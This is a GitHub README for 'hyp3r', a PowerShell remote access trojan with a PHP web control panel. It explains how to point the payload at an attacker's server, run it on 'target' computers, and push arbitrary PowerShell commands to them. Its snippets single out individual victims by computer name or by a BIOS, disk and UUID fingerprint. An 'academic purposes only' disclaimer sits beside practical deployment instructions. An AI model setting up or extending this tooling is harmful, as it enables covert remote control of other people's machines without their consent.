# hyp3r RAT

![GitHub License](https://img.shields.io/github/license/XZE3N/hyp3r)
![GitHub last commit](https://img.shields.io/github/last-commit/XZE3N/hyp3r)
![GitHub Issues or Pull Requests](https://img.shields.io/github/issues/XZE3N/hyp3r)
![GitHub contributors](https://img.shields.io/github/contributors/XZE3N/hyp3r)

<img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/PowerShell_5.0_icon.png" alt="PowerShell" />

## hyp3r is a basic Remote Access Tool (RAT) written in powershell.

**DISCLAIMER: THIS PROJECT IS FOR ACADEMIC PURPOSES ONLY. THE DEVELOPERS TAKE NO RESPONSIBILITY FOR ILLEGAL USAGE AND/OR POTENTIAL HARMS.**

## Requirements
  - PHP 8.0.2 (might work on older versions as well).
  - Apache web server.
  - PowerShell version 5.1 (might work on older versions as well) installed on the target computer (Required for cmdlets to run).

## Features
  - WebGUI.
  - Live target status.
  - Remote shell execution.
  - Multi-target support (The script can handle as many targets as your server can).
  - Simple and easy to customize scripts.

## Notes
  - The timezone of both the server and the payload are set to GTB Standard Time so take that into account if you want to modify the inner workings of the script.
  - Remember to modify the parameters inside the payload (`http.ps1`) to suit your needs.

## Installation

### 1. Clone this repository

You can use git to clone this repository or download the .zip file from GitHub.

```bash
git clone https://github.com/xze3n/hyp3r.git
cd hyp3r/
```

### 2. Configure
  - Copy the contents of the `apache` folder to your webserver's page folder.
  - Edit lines `2`, `3` and `4` inside `http.ps1` as follows: 

```powershell
$verurl = 'http://your_website_url_or_ip/script.txt'
$url = 'http://your_website_url_or_ip'
$stop = 'the syntax of your choice to force stop the payload on the target machine'
```

  - Save and close the file. The installation is now complete!

## Usage

#### 1. Start your webserver.
#### 2. Run the powershell payload on the target computer.
#### 3. Open `localhost` inside a browser to see the active connections.

#### To run commands on the target computer(s) open the file called `script.txt` inside your webserver's page folder and modify its contents
  - Example:
```powershell
[System.Console]::Beep(1000,300)
```

  -the syntax above will result in a short *beep* given out by the target
### Notes:
  - The commands or scripts you write inside `script.txt` must be powershell code (obviously).
  - If you have multiple targets that listen to the same server the commands inside `script.txt` will be ran by all of the computers listening.
  - If you want to run a command only on one of the targets you will have to get a little creative:

```powershell
if($env:COMPUTERNAME -eq "TARGET-PC") {
	echo "now it will only be executed by targets with the user TARGET-PC"
}
```
  - If the `COMPUTERNAME` identifier is way to simple for your needs and it brings up problems you can use the scripts unique identifier composed of the biosid, hddid and uuid of the target computer

```powershell
$a=Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios=$a.split(' ')[2].Trim(); #bios id
$b=wmic diskdrive get serialnumber; $id_hdd=$b.split('\n')[2].Trim(); #hdd id
$c=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;$id_uuid=$c.split(' ')[64].Trim() #uuid
$ids=$ids=$id_bios, $id_hdd, $id_uuid; $ids=[system.String]::Join("_", $ids);
if($ids -eq "UNIQUE_IDENTIFIER") {
	doStuff()
}
```


  - You can get the UNIQUE_IDENTIFIER of a computer from the `data.txt` file inside the webserver's page folder: 
  - eg. `CND83492ZZ_69BCTDGFT_760BD1B8-5170-E821-A4C3-1063E5C2E22F`.
